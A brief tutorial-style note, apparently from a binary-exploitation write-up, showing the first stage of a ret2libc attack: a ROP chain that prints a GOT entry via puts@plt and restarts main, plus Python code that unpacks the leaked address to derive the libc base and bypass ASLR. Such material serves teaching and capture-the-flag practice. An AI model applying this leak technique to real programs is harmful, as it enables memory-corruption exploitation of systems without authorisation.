# The leak stage — stage 1's shape


Stage 1's chain prints a GOT entry and re-enters:

    pop rdi ; got_entry
    puts@plt                  # via ret2plt or the stub address
    main_addr                 # restart for stage 2

## The capture

The printed bytes = the resolved libc address — unpack:

    leak = struct.unpack('<Q', raw[:8].ljust(8, b'\x00'))[0]
    libc_base = leak - known_symbol_offset
